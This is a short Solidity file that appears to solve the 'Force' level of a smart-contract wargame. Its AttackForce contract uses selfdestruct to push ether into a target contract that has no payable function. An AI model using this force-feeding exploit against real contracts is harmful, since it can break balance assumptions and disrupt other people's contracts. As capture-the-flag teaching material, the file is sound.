// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Force {
    /*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/
}

contract AttackForce {
    address payable _targetContract;

    constructor(address payable _newTargetContract) public {
        _targetContract = _newTargetContract;
    }

    receive() external payable {
        selfdestruct(_targetContract);
    }
}
